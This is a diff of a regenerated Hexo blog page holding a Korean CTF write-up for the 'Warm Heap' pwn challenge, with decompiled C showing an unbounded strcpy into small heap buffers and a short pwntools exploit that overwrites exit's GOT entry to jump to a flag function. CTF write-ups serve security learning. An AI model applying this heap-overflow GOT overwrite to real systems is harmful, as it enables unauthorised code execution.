@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="utf-8">
-	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416">
+<head>
+    <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="utf-8" />
+	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416"/>
 	<!-- Global site tag (gtag.js) - Google Analytics -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140827316-1"></script>
 	<script>
@@ -18,54 +18,72 @@
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-        <meta name="keywords" content="CTF">
+        <meta name="keywords" content="CTF" />
     
-    <meta name="description" content="Warm Heap Binary File 123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&amp;#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-101">
-<meta name="keywords" content="CTF">
+    <meta name="description" content="Warm Heap Binary File 12345678910111213141516171819202122void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&amp;#123;  void *v3; &#x2F;&#x2F; ST10_8  void *v4; &#x2F;&#x2F; ST18_8  char s; &#x2F;&#x2F; [rsp+20h] [rbp-1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Warm Heap">
 <meta property="og:url" content="https://j0n9hyun.xyz/writeups/pwn/warm_heap/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="Warm Heap Binary File 123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&amp;#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-101">
-<meta property="og:locale" content="ko">
+<meta property="og:description" content="Warm Heap Binary File 12345678910111213141516171819202122void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&amp;#123;  void *v3; &#x2F;&#x2F; ST10_8  void *v4; &#x2F;&#x2F; ST18_8  char s; &#x2F;&#x2F; [rsp+20h] [rbp-1">
+<meta property="og:locale" content="ko_KR">
 <meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58141715-457cac00-7c7f-11e9-9752-78718ea07c25.png">
-<meta property="og:updated_time" content="2019-05-24T13:14:48.000Z">
+<meta property="article:published_time" content="2019-03-05T02:22:00.000Z">
+<meta property="article:modified_time" content="2019-05-24T13:14:48.000Z">
+<meta property="article:author" content="j0n9hyun">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Warm Heap">
-<meta name="twitter:description" content="Warm Heap Binary File 123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&amp;#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-101">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58141715-457cac00-7c7f-11e9-9752-78718ea07c25.png">
     
-	<link rel="canonical" href="https://j0n9hyun.xyz/writeups/pwn/warm_heap/">
+	<link rel="canonical" href="https://j0n9hyun.xyz/writeups/pwn/warm_heap/"/>
 
     
 
     
-        <link rel="icon" href="https://ctf.j0n9hyun.xyz/files/fbf1004228885fb7ac783e1d540d4538/vector.ico">
+        <link rel="icon" href="https://ctf.j0n9hyun.xyz/files/fbf1004228885fb7ac783e1d540d4538/vector.ico" />
     
 
-    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
-    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
 
-	<link rel="stylesheet" type="text/css" href>
-	<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">	
-	<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
-    <link rel="stylesheet" href="/css/style.css">
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
 
-    <script src="/libs/jquery/3.3.1/jquery.min.js"></script>
     
-    
-        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
-    
-    
-        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-    
-    
-    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
 
 
-</head>
-</html>
+	<link rel="stylesheet" type="text/css" href="">
+	
+<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">
+	
+	
+<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+
+
+<meta name="generator" content="Hexo 5.0.2"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
 <body>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="wrap">
         <header id="header">
@@ -93,13 +111,13 @@
                     <div class="nav-container-inner">
                         <ul id="main-nav">
                             
-                                <li class="main-nav-list-item">
+                                <li class="main-nav-list-item" >
                                     <a class="main-nav-list-link" href="/">Home</a>
                                 </li>
                             
                                         <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Daily/">Daily</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/">Develop</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Script/">Script</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Rev/">Rev</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Web/">Web</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/misc/">misc</a></li></ul></li></ul>
                                     
-                                <li class="main-nav-list-item">
+                                <li class="main-nav-list-item" >
                                     <a class="main-nav-list-link" href="/about">About</a>
                                 </li>
                             
@@ -108,14 +126,14 @@
                             <div id="search-form-wrap">
 
     <form class="search-form">
-        <input type="text" class="ins-search-input search-form-input" placeholder="검색">
+        <input type="text" class="ins-search-input search-form-input" placeholder="검색" />
         <button type="submit" class="search-form-submit"></button>
     </form>
     <div class="ins-search">
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="입력">
+            <input type="text" class="ins-search-input" placeholder="입력" />
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -139,7 +157,9 @@
     window.INSIGHT_CONFIG = INSIGHT_CONFIG;
 })(window);
 </script>
+
 <script src="/js/insight.js"></script>
+
 
 </div>
                         </nav>
@@ -189,7 +209,7 @@
                 
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/">CTF</a>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>
     </div>
 
   			<span class="reading-time">⏱ 3 분</span>
@@ -198,12 +218,12 @@
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="warm-heap"><a class="markdownIt-Anchor" href="#warm-heap"></a> Warm Heap</h2>
-<p><a href="https://github.com/j0n9hyun/CTF/files/3205199/warm_heap.zip" target="_blank" rel="noopener">Binary File</a></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);</span><br><span class="line">  *(_DWORD *)v3 = <span class="number">1</span>;</span><br><span class="line">  *((_QWORD *)v3 + <span class="number">1</span>) = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);</span><br><span class="line">  *(_DWORD *)v4 = <span class="number">2</span>;</span><br><span class="line">  *((_QWORD *)v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  fgets(&amp;s, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)v3 + <span class="number">1</span>), &amp;s);</span><br><span class="line">  fgets(&amp;s, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)v4 + <span class="number">1</span>), &amp;s);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/j0n9hyun/CTF/files/3205199/warm_heap.zip">Binary File</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);</span><br><span class="line">  *(_DWORD *)v3 = <span class="number">1</span>;</span><br><span class="line">  *((_QWORD *)v3 + <span class="number">1</span>) = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);</span><br><span class="line">  *(_DWORD *)v4 = <span class="number">2</span>;</span><br><span class="line">  *((_QWORD *)v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  fgets(&amp;s, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)v3 + <span class="number">1</span>), &amp;s);</span><br><span class="line">  fgets(&amp;s, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)v4 + <span class="number">1</span>), &amp;s);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <center><small> [메인 함수] </small></center>
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58141715-457cac00-7c7f-11e9-9752-78718ea07c25.png">
 <center><small> [동작 과정] </small></center>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./warm_heap.bin'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./warm_heap.bin'</span>)</span><br><span class="line">flag = <span class="number">0x400826</span></span><br><span class="line">exit_got = <span class="number">0x601068d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">40</span> + p64(elf.got[<span class="string">'exit'</span>]) + <span class="string">"\n"</span> + p64(flag)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./warm_heap.bin&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./warm_heap.bin&#x27;</span>)</span><br><span class="line">flag = <span class="number">0x400826</span></span><br><span class="line">exit_got = <span class="number">0x601068d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span> + p64(elf.got[<span class="string">&#x27;exit&#x27;</span>]) + <span class="string">&quot;\n&quot;</span> + p64(flag)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <center><small> [Exploit Code] </small></center> <br>
 <style>
   img.border-shadow{
@@ -218,7 +238,7 @@
 
 
 
-    <a data-url="https://j0n9hyun.xyz/writeups/pwn/warm_heap/" data-id="ck5p1nopp003ulyfpf60vjbo1" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="https://j0n9hyun.xyz/writeups/pwn/warm_heap/" data-id="ckdzanqg8005oz5mpfs2u8c56" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -298,7 +318,7 @@
         "url": "https://j0n9hyun.xyz/writeups/pwn/warm_heap/",
         "description": " Warm Heap
 Binary File
-123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-101"
+12345678910111213141516171819202122void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-1"
         "wordCount": 287
     }
 </script>
@@ -416,7 +436,7 @@ Binary File
     <div class="widget-wrap widget-list">
         <h3 class="widget-title">태그</h3>
         <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/">Theory</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/">Tips</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/">Wargame</a><span class="tag-list-count">3</span></li></ul>
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/" rel="tag">Theory</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/" rel="tag">Tips</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/" rel="tag">Wargame</a><span class="tag-list-count">3</span></li></ul>
         </div>
     </div>
 
@@ -471,25 +491,47 @@ Binary File
 
 
     
-        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
     
     
-        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
     
     
 
 
 
 <!-- Custom Scripts -->
+
 <script src="/js/main.js"></script>
+
 
     </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </body>
